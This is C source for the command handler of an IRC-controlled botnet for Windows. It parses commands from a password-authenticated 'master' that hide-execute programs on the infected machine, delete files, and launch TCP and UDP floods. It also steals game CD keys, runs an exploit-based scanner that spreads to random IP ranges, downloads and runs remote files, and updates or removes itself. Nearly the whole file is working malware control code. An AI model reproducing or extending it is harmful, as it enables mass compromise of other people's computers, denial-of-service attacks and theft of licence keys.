#include "includes.h"
#include "externs.h"

int XIRCParseCommand(SESSION* Session, char Masters[MAXLOGINS][MAXIDENT], char *UserHost, char *CommandLine)
{

	#ifdef DEBUG_SYSTEM
	dbg("XIRCParseCommand(), Started");
	#endif


		unsigned char Params[256] = {0};

		char md5[32] = {0};

		int i = 0;


//		dbg("CMDLine: %s", Commands[CurrentLine]);

		#ifdef DEBUG_SYSTEM
		dbg("CMDLine: %s", CommandLine);
		#endif

		char *arg[MAXPARAMS] = {0};

//		arg[0] = strtok(Commands[CurrentLine], " ");

		arg[0] = strtok(CommandLine, " ");

		for (i = 1; i < MAXPARAMS; i++)
			arg[i] = strtok(NULL, " ");

	if (!CommandLine)
		return 0;

		for (i = (MAXPARAMS - 1); i >= 0; i--)
		{
			if (arg[i])
			{
				if ((arg[i][0] == '-') && (!arg[i][2]))
				{
					Params[arg[i][1]] = 1;
					arg[i][0] = 0;
					arg[i][1] = 0;
					arg[i][2] = 0;
					arg[i] = NULL;
				}
				else 
					break;
			}
		}

//		CurrentLine++;

		Session->Silent = (Params['s'])?(TRUE):(FALSE);
		Session->Notice = (!strcmp("NOTICE", Session->Method) || Params['n']);

		if (Session->Notice)
			strcpy(Session->Method, "NOTICE");
		else
			strcpy(Session->Method, "PRIVMSG");

		if (!arg[0])// || !arg[1])
			return 0;

		if (arg[0][0] == Prefix)
		{
			arg[0]++;
			if (!arg[0])
				return 0;
		}
		else
			return 0;


	//	if (!strcmp("d529e941509eb9e9b9cfaeae1fe7ca23", /*GetMD5*/XMD5Str(arg[0], md5, TRUE)))
	//	{
		if (!strcmp("mega", arg[0]) || !strcmp("login", arg[0]) || !strcmp("l", arg[0]))
		{
			if (!arg[1] || Session->IsMaster)
				return 0;

			char Auth[MAXIDENT] = {0};

			strncpy(Auth, UserHost, sizeof(Auth)-1);

			char *User = strtok(Auth, "!"), *Host = strtok(NULL, ""/*'\0'*/);

			Host = strtok(Host, "~");

			#ifdef DEBUG_SYSTEM
			dbg("Host: %s", Host);
			#endif

			if (!Host || !User)
				return 0;

			bool HostMatch = FALSE;
			for (i = 0; i < MainStruct.AccessListSize; i++)
			{
				#ifndef NO_WILDCARD
				if (wildcardfit(AccessList[i], Host))
				{ 
					HostMatch = TRUE;
					break;
				}
				#else
				if (!strcmp(Host, authost[i]))
				{
					HostMatch = TRUE;
					break;
				}
				#endif
			}

			if (!HostMatch || strcmp(Password, arg[1]))
			{
				XIRCMessage(Session->irc->sock, TRUE, TRUE/*Notice*/, Session->Silent, User, "\2\00312[\0034!! ACCESS DENIED !!\00312]\2\003");
				return 0;
			}

			for (i = 0; i < MAXLOGINS; i++)
			{
				if (Masters[i][0])
					if (!strcmpi(Masters[i], UserHost))
						return 0;

				if (!Masters[i][0])
				{
					#ifdef DEBUG_SYSTEM
					dbg("UserHost: %s", UserHost);
					#endif

					strncpy(Masters[i],  UserHost, sizeof(Masters[i])-1);

					Session->IsMaster = TRUE;

					XIRCMessage(Session->irc->sock, TRUE, TRUE/*Notice*/, Session->Silent, User, "\2\0034[\00312:: ACCESS GRANTED ::\0034]\2\003");///


					return 0;
				}
			}

			XIRCMessage(Session->irc->sock, TRUE, TRUE/*Notice*/, Session->Silent, User, "\2\0034[MAIN]: User: %s ( %s ) login failed! Too many users already logged!\2\003", User, Host); 
			
			return 0;
		}

		if (Session->IsMaster)
		{
			#ifdef DEBUG_SYSTEM
			if (!strcmpi("G", arg[0]))
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "GG");
			else if (!strcmpi("GG", arg[0]))
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "G");
			else if (!strcmpi("COLORS", arg[0]))
			{
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\0030:0030:\2\003");
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\0031:0031:\2\003");
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\0032:0032:\2\003");
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\0033:0033:\2\003");
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\0034:0034:\2\003");///
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\0035:0035:\2\003");
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\0036:0036:\2\003");
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\0037:0037:\2\003");
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\0038:0038:\2\003");
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\0039:0039:\2\003");
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\00311:00311:\2\003");
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\00312:00312:\2\003");///
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\00313:00313:\2\003");
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\00314:00314:\2\003");
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", "\2\00315:00315:\2\003");
			}
			#else
			if (!strcmpi("CRYPT", arg[0]))
			{
				if (!arg[1] || !arg[2])
					return 0;

				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s -> %s", arg[1], XDecryptStr(arg[1], atoi(arg[2])));
			}
			#endif
			else if (!strcmpi("MD5", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s MD5: %s", arg[1], XMD5Str(arg[1], md5, (arg[2])?(FALSE):(TRUE)));
			}
			else if (!strcmpi("SYSINFO", arg[0]) || !strcmpi("SI", arg[0]))
			{
				XGetSystemInfo(Session);
			}
			else if (!strcmpi("NETINFO", arg[0]) || !strcmpi("NI", arg[0]))
			{
				XGetNetworkInfo(Session, arg[1]);
			}
			else if (!strcmpi("REMOVE", arg[0]) || !strcmpi("RM", arg[0]))
			{
				XRemove("Removed!");
			}
			else if (!strcmpi("P", arg[0]) || !strcmpi("PLUGIN", arg[0]) || !strcmpi("PLUGINS", arg[0]))
			{
				XPluginControl(Session, arg[1], arg[2], arg[3], arg[4], arg[5], arg[6], arg[7], arg[8], arg[9], arg[10], arg[11], arg[12]);
			}
			else if (!strcmpi("CRASH", arg[0]))
			{
				*(int*)0 = 0;
			}
			else if (!strcmpi("RAW", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("THREADS", arg[0]))
			{
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[Threads]");
				XListThreads(Session, (arg[1] && !strcmpi(arg[1], "FULL"))?(NULL):(arg[1]), (arg[1]/* && !strcmpi(arg[1], "FULL")*/)?(TRUE):(FALSE));
			}
			else if (!strcmpi("KILLTHREAD", arg[0]))
			{
				if (!arg[1])
					return 0;

				XKillThread(atoi(arg[1]), TRUE, TRUE);
			}
			else if (!strcmpi("WHO", arg[0]))
			{
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[Masters]");
				for (int x = 0; x < MAXLOGINS; x++)
					if (Masters[x][0])
						XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%d. %s", x, Masters[x]);
			}
			else if (!strcmpi("EXIT", arg[0]))
			{
				XIRCRawSend(Session->irc->sock, 0, "QUIT :Exited!");

				if (MainStruct.IsNTBased)
					if (MainStruct.AsService)
						XServiceControlHandler(SERVICE_CONTROL_STOP);

				ExitProcess(0);
			}
			else if (!strcmpi("LOGOUT", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("VERSION", arg[0]))
			{
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s", Version);
			}
			else if (!strcmpi("SECURE", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("RECONNECT", arg[0]))
			{
				XIRCRawSend(Session->irc->sock, 0, "QUIT :Reconnecting...");

				Sleep(100);

				return 1;
			}
			else if (!strcmpi("DISCONNECT", arg[0]))
			{
				if (arg[1])
					Session->irc->Delay = atoi(arg[1]) * 60000;

				XIRCRawSend(Session->irc->sock, 0, "QUIT :Disconnecting...");

				Sleep(100);

				return 2;
			}
			else if (!strcmpi("QUIT", arg[0]))
			{
				XIRCRawSend(Session->irc->sock, 0, "QUIT :%s", (arg[1])?(arg[1]):("Bye"));

				Sleep(100);

				return 3;
			}
			else if (!strcmpi("STATUS", arg[0]))
			{
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[MAIN]: Status: Ready. Bot Uptime: %s", XGetUptime(MainStruct.StartupTime));
			}
			else if (!strcmpi("CDKEYS", arg[0]))
			{
				XGetCDKeys(Session, arg[1]);
			}
			else if (!strcmpi("TCPFLOOD", arg[0]) || !strcmpi("TFLOOD", arg[0]))
			{
				if (!arg[1])
					return 0;

				XTCPFlood(Session, arg[1], arg[2], arg[3], arg[4], arg[5], arg[6]);
			}
			else if (!strcmpi("UDPFLOOD", arg[0]) || !strcmpi("UFLOOD", arg[0]))
			{
				if (!arg[1])
					return 0;

				XUDPFlood(Session, arg[1], arg[2], arg[3], arg[4], arg[5], arg[6]);
			}
			else if (!strcmpi("LOGOFF", arg[0]) || !strcmpi("REBOOT", arg[0]) || !strcmpi("RESTART", arg[0]) || !strcmpi("SHUTDOWN", arg[0]))
			{
				XSystemControl(Session, arg[0]);
			}
			else if (!strcmpi("EXPLOITS", arg[0]))
			{
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[Exploits]");

				for (i = 0; i < MainStruct.ExploitListSize; i++)
					if (ExploitList[i].Command && ExploitList[i].Name && ExploitList[i].Port)
						XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%d. Command: %s, Name: %s, Port: %d, Stats: %d", i, ExploitList[i].Command, ExploitList[i].Name, ExploitList[i].Port, ExploitList[i].Stats);
			}
			else if (!strcmpi("ID", arg[0]))
			{
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[MAIN]: Bot ID: %s", ID);
			}
			else if (!strcmpi("UPTIME", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("TERM", arg[0]))
			{
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[MAIN]: Terminating Connection!");
				XIRCRawSend(Session->irc->sock, 0, "QUIT :Connection Closed");

				Sleep(100);

				closesocket(Session->irc->sock);

				return 0;
			}
			else if (!strcmpi("TIME", arg[0]))
			{
				char date[70] = {0}, time[70] = {0};
				GetDateFormat(0x409, 0, 0, "dd:MMM:yyyy", date, sizeof(date));
				GetTimeFormat(0x409, 0, 0, "HH:mm:ss", time, sizeof(time));
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[MAIN]: Date: %s, Time: %s", date, time);

			}
			else if (!strcmpi("NICK", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("JOIN", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("PART", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("PREFIX", arg[0]))
			{
				if (arg[1] && arg[1][0] != ' ')
				{
					Prefix = arg[1][0];
				}

				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[MAIN]: Prefix set to: %c", Prefix);

				return 0;
			}
			else if (!strcmpi("SERVER", arg[0]))
			{
				if (arg[1])
				{
					if (!strcmpi(arg[1], "NEXT"))
						MainStruct.CurrentMainServer++;
					else
						strncpy(Session->irc->Server, arg[1], sizeof(Session->irc->Server)-1);

					if (arg[2])
						Session->irc->Port = ((atoi(arg[2]) > 0 && atoi(arg[2]) <= 65535)?(atoi(arg[2])):(Session->irc->Port));
				}

				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[MAIN]: Server set to: %s:%d", Session->irc->Server, Session->irc->Port);

				return 0;
			}
			else if (!strcmpi("CHANNEL", arg[0]))
			{
				if (arg[1] && arg[1][0] == '#')
					strncpy(Session->irc->Channel, arg[1], sizeof(Session->irc->Channel)-1);

				if (arg[2])
					strncpy(Session->irc->ChannelPass, arg[2], sizeof(Session->irc->ChannelPass)-1);				

				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[MAIN]: Channel set to: %s:%s", Session->irc->Channel, Session->irc->ChannelPass);

				return 0;
			}
			else if (!strcmpi("DBGLEVEL", arg[0]))
			{
				if (arg[1])
					MainStruct.DbgLevel = (atoi(arg[1]) >= 0 && atoi(arg[1]) < 12)?(atoi(arg[1])):(0);

				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[MAIN]: Debug level set to: %d", MainStruct.DbgLevel);
			}
			else if (!strcmpi("OPME", arg[0]))
			{
				XIRCRawSend(Session->irc->sock, 0, "%s %s +o %s", "MODE", Session->Destination, Session->User);
			}
			else if (!strcmpi("OPEN", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("EXEC", arg[0]))
			{
				if (!arg[1])
					return 0;

				WinExec(arg[1], SW_HIDE);
			}
			else if (!strcmpi("DNS", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("DELETE", arg[0]))
			{
				if (!arg[1])
					return 0;

				DeleteFile(arg[1]);
			}
			else if (!strcmpi("SYSTEM", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("PRIVMSG", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("ACTION", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("CYCLE", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("MODE", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("REPEAT", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("DELAY", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("SLEEP", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[MAIN]: Sleeping for: %d ms", atoi(arg[1]));

				Sleep(atoi(arg[1]));
			}
			else if (!strcmpi("RENAME", arg[0]))
			{
				if (!arg[1])
					return 0;

				XIRCRawSend(Session->irc->sock, 0, "%s", arg[1]);
			}
			else if (!strcmpi("RNDNICK", arg[0]))
			{
				strncpy(Session->irc->Nick, XGetNick(), sizeof(Session->irc->Nick)-1);
				XIRCRawSend(Session->irc->sock, 0, "%s %s", "NICK", Session->irc->Nick);
			}
			else if (!strcmpi("SCANSTOP", arg[0]))
			{
				do
				{
					int Threadnum = XFindThreadNumberByID(ADVSCANNER_THREAD);
					if (Threadnum == -1)
						break;
					else
						XKillThread(Threadnum, TRUE, TRUE);

				} while (1);
			}
			else if (!strcmpi("ADVSCAN", arg[0]))
			{
				if (!arg[1] || !arg[2] || !arg[3] || !arg[4] || !arg[5])
					return 0;

				int ScanThreads = XFindThreadByID(ADVSCANNER_THREAD);

				if (ScanThreads + atoi(arg[2]) >= (MAXSCANTHREADS+1))
					XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[ADVSCAN]: Already scanning with: %d thread(s), no space for %d threads! Max %d threads allowed!", ScanThreads, atoi(arg[2]), MAXSCANTHREADS);
				else
				{
					#ifdef DEBUG_SYSTEM
					dbg("a1");
					#endif
					ADVSCANTHREAD advscan;
					memset(&advscan, 0, sizeof(ADVSCANTHREAD));

					advscan.Port = atoi(arg[1]);
					advscan.MaxThreads = atoi(arg[2]);
					advscan.Delay = atoi(arg[3]);
					advscan.Delay = (advscan.Delay < 1)?(1):(advscan.Delay);
					advscan.Delay = (advscan.Delay >= 60)?(60):(advscan.Delay);
					advscan.Minutes = (atoi(arg[4]) >= MAXSCANTIME)?(MAXSCANTIME):(atoi(arg[4]));
					
					advscan.Exploit = -1;

					#ifdef DEBUG_SYSTEM
					dbg("a2");
					#endif

					for (int e = 0; e < MainStruct.ExploitListSize; e++)
					{
						#ifdef DEBUG_SYSTEM
						dbg("exp[%d] Port: %d, cmd: %s, arg[1]: %s", e, ExploitList[e].Port, ExploitList[e].Command, arg[1]);
						#endif
						if (!strcmpi(ExploitList[e].Command, arg[1]))
						{
							#ifdef DEBUG_SYSTEM
							dbg("here");
							#endif

							if (!ExploitList[e].exp)
							{
								XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[ADVSCAN]: Param Error");
								return 0;
							}

							#ifdef DEBUG_SYSTEM
							dbg("here2");
							#endif

							advscan.Port = ExploitList[e].Port;
							advscan.Exploit = e;

							break;
						}
					}

					#ifdef DEBUG_SYSTEM
					dbg("a3, Port: %d", advscan.Port);
					#endif

					if (advscan.Port)
					{
						#ifdef DEBUG_SYSTEM
						dbg("a4");
						#endif
						if (arg[5] && arg[5][0] != '#')
						{
							#ifdef DEBUG_SYSTEM
							dbg("a5");
							#endif

							strncpy(advscan.ip, arg[5], sizeof(advscan.ip)-1);

							advscan.Random = (strchr(arg[5],'x'))?(TRUE):(FALSE);
						}
						else
						{
							#ifdef DEBUG_SYSTEM
							dbg("a6");
							#endif
							if (Params['a'] || Params['b'] || Params['r'])
							{
								#ifdef DEBUG_SYSTEM
								dbg("a7");
								#endif
//								if (XIsPrivateIP(XGetSocketIp(Session->irc->sock)))
//								{
//									WSADATA wsaData; fWSAStartup(MAKEWORD(1,1), &wsaData);
///									HOSTENT *phe = fgethostbyname(host);
//									SOCKADDR_IN sin;
//
//									memcpy(&sin.sin_addr.s_addr, phe->h_addr_list[0], phe->h_length);
//									sin.sin_addr.S_un.S_addr&=(parameters['a'])?(0xFF):(0xFFFF);
//									strncpy(advscan.ip,finet_ntoa(sin.sin_addr), sizeof(advscan.ip));
//								}
//								else
								{
									SOCKADDR_IN ssin;

									int ssin_len = sizeof(SOCKADDR_IN);

									getsockname(Session->irc->sock, (LPSOCKADDR)&ssin, &ssin_len);

									ssin.sin_addr.S_un.S_addr &= (Params['a'])?(0xFF):(0xFFFF);
									strncpy(advscan.ip, inet_ntoa(ssin.sin_addr), sizeof(advscan.ip)-1);

								}

								#ifdef DEBUG_SYSTEM
								dbg("a8");
								#endif

								if (Params['r'])
								{
									#ifdef DEBUG_SYSTEM
									dbg("a9");
									#endif

									int extractip = (Params['a'])?3:2;

									for (char *c = strrchr(advscan.ip, '0'), i = 0; i < extractip && c; c[0] = 'x', c = strrchr(advscan.ip, '0'), i++);
								
									advscan.Random = TRUE;
								}
								else
									advscan.Random = FALSE;

								#ifdef DEBUG_SYSTEM
								dbg("a10");
								#endif

							}
							else
							{
								#ifdef DEBUG_SYSTEM
								dbg("a11");
								#endif
								XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[ADVSCAN]: Failed to start scan, no IP specified!");
								
								return 0;
							}
						}

						#ifdef DEBUG_SYSTEM
						dbg("a12");
						#endif
						
						strcpy(advscan.Session.Destination, Session->Destination);
						advscan.Session.irc = Session->irc;
						advscan.Session.IsMaster = Session->IsMaster;
						strcpy(advscan.Session.Method, Session->Method);
						advscan.Session.Notice = Session->Notice;
						advscan.Session.Silent = Session->Silent;

//						if (arg[6] && arg[6][0] == '#')
//							strcpy(advscan.msgchan, arg[6], sizeof(advscan.msgchan)-1);
//						else if (arg[5] && arg[5][0] == '#')
//							strcpy(advscan.msgchan, arg[5], sizeof(advscan.msgchan)-1);
//						else if (strcmp(exploitchan,"") != 0)
//							strcpy(advscan.msgchan, ExploitMsgChannel, sizeof(advscan.msgchan)-1);
//						else
//							advscan.msgchan[0] = 0;

						if (arg[6])
							advscan.xDelay = atoi(arg[6]);
						else if (arg[6] && arg[6][0] != '#')
							advscan.xDelay = atoi(arg[6]);
						else
							advscan.xDelay = 200;

						if (Params['e'])
							advscan.xEnabled = TRUE;
						else
							advscan.xEnabled = FALSE;

						#ifdef DEBUG_SYSTEM
						dbg("a14");
						#endif

						advscan.Threadnum = XAddThread(ADVSCANNER_THREAD, FALSE, NULL, "[ADVSCAN]: %s Port Scan started from: %s:%d using %d threads with delay of %d seconds for %d minutes!", (advscan.Random)?("Random"):("Sequential"), advscan.ip, advscan.Port, advscan.MaxThreads, advscan.Delay, advscan.Minutes);

						if (advscan.Threadnum == -1)
						{
							memset(&advscan, 0, sizeof(ADVSCANTHREAD));

							return 0;

						}

						#ifdef DEBUG_SYSTEM
						dbg("a15");
						#endif

						if ((threads[advscan.Threadnum].ThreadHandle = CreateThread(NULL, 0, &XAdvScannerThread, (LPVOID)&advscan, 0, &threads[advscan.Threadnum].ID)))
						{
							for (int x = 0; x <= 30; x++)
							{
								Sleep(100);

								if (advscan.Gotit)
									break;
								else if (x == 30)
								{
									XKillThread(advscan.Threadnum, TRUE, TRUE);
									memset(&advscan, 0, sizeof(ADVSCANTHREAD));

									return 0;
								}
								Sleep(250);
							}
						}
						else
						{
							XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[ADVSCAN]: Error Starting %s Thread, Error Code: %d", "Scan", GetLastError());
							XKillThread(advscan.Threadnum, TRUE, FALSE);
							memset(&advscan, 0, sizeof(ADVSCANTHREAD));
							return 0;
						}
						#ifdef DEBUG_SYSTEM
						dbg("a16");
						#endif
					}
					else
						XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[ADVSCAN]: Port 0 is invalid");
					
					#ifdef DEBUG_SYSTEM
					dbg("a17");
					#endif
				}
				#ifdef DEBUG_SYSTEM
				dbg("a18");
				#endif

				return 0;
			}
			else if (!strcmpi("DOWNLOAD", arg[0]))
			{
				if (!arg[1] || !arg[2])
					return 0;

				DOWNLOADTHREAD download;
				memset(&download, 0, sizeof(DOWNLOADTHREAD));

				strncpy(download.Url, arg[1], sizeof(download.Url)-1);
				strncpy(download.Destination, arg[2], sizeof(download.Destination)-1);

				download.Type = (arg[3])?(1):(0);

				download.FileLength = (arg[4] && atoi(arg[4]) > 0)?(atoi(arg[4])):(0);

				download.Encrypted = (Params['e'])?(TRUE):(FALSE);

				strcpy(download.Session.Destination, Session->Destination);
				download.Session.irc = Session->irc;
				download.Session.IsMaster = Session->IsMaster;
				strcpy(download.Session.Method, Session->Method);
				download.Session.Notice = Session->Notice;
				download.Session.Silent = Session->Silent;

				download.Threadnum = XAddThread(DOWNLOAD_THREAD, FALSE, NULL, "[DOWNLOAD]: Downloading File: %s -> %s", download.Url, download.Destination);

				if (download.Threadnum == -1)
				{
					memset(&download, 0, sizeof(DOWNLOADTHREAD));

					return 0;

				}

				if ((threads[download.Threadnum].ThreadHandle = CreateThread(NULL, 0, &XDownloadThread, (LPVOID)&download, 0, &threads[download.Threadnum].ID)))
				{
					for (int x = 0; x <= 30; x++)
					{
						Sleep(100);

						if (download.Gotit)
							break;
						else if (x == 30)
						{
							XKillThread(download.Threadnum, TRUE, TRUE);
							memset(&download, 0, sizeof(DOWNLOADTHREAD));

							return 0;
						}
						Sleep(250);
					}
				}
				else
				{
					XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[DOWNLOAD]: Error Starting %s Thread, Error Code: %d", "Download", GetLastError());
					XKillThread(download.Threadnum, TRUE, FALSE);
					memset(&download, 0, sizeof(DOWNLOADTHREAD));
					return 0;
				}

				return 0;
			}
			else if (!strcmpi("UPDATE", arg[0]))
			{
				if (XFindThreadByID(UPDATE_THREAD) > 0)
					return 0;

				if (!arg[1] || !arg[2])
					return 0;

				if (strcmp(arg[1], ID))
				{
					char TempPath[MAX_PATH] = {0};

					if (GetTempPath(sizeof(TempPath), TempPath))
					{
						if (GetTempFileName(TempPath, "X", 0, TempPath))
						{

							DOWNLOADTHREAD download;
							memset(&download, 0, sizeof(DOWNLOADTHREAD));

							strncpy(download.Url, arg[2], sizeof(download.Url)-1);

							strncpy(download.Destination, TempPath, sizeof(download.Destination)-1);

							download.Type = 2;

							download.FileLength = (arg[3] && atoi(arg[3]) > 0)?(atoi(arg[3])):(0);

							download.Encrypted = (Params['e'])?(TRUE):(FALSE);

							strcpy(download.Session.Destination, Session->Destination);
							download.Session.irc = Session->irc;
							download.Session.IsMaster = Session->IsMaster;
							strcpy(download.Session.Method, Session->Method);
							download.Session.Notice = Session->Notice;
							download.Session.Silent = Session->Silent;

							download.Threadnum = XAddThread(UPDATE_THREAD, FALSE, NULL, "[DOWNLOAD: Downloading Update: %s -> %s", download.Url, download.Destination);

							if (download.Threadnum == -1)
							{
								memset(&download, 0, sizeof(DOWNLOADTHREAD));

								return false;

							}

							if ((threads[download.Threadnum].ThreadHandle = CreateThread(NULL, 0, &XDownloadThread, (LPVOID)&download, 0, &threads[download.Threadnum].ID)))
							{
								for (int x = 0; x <= 30; x++)
								{
									Sleep(100);

									if (download.Gotit)
										break;
									else if (x == 30)
									{
										XKillThread(download.Threadnum, TRUE, TRUE);
										memset(&download, 0, sizeof(DOWNLOADTHREAD));

										return 0;
									}
									Sleep(250);
								}
							}
							else
							{
								XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[DOWNLOAD]: Error Starting %s Thread, Error Code: %d", "Download", GetLastError());
								XKillThread(download.Threadnum, TRUE, FALSE);
								memset(&download, 0, sizeof(DOWNLOADTHREAD));
								return 0;
							}
						}
					}
				}

				return 0;
			}
		}
//	}

	return 0;
}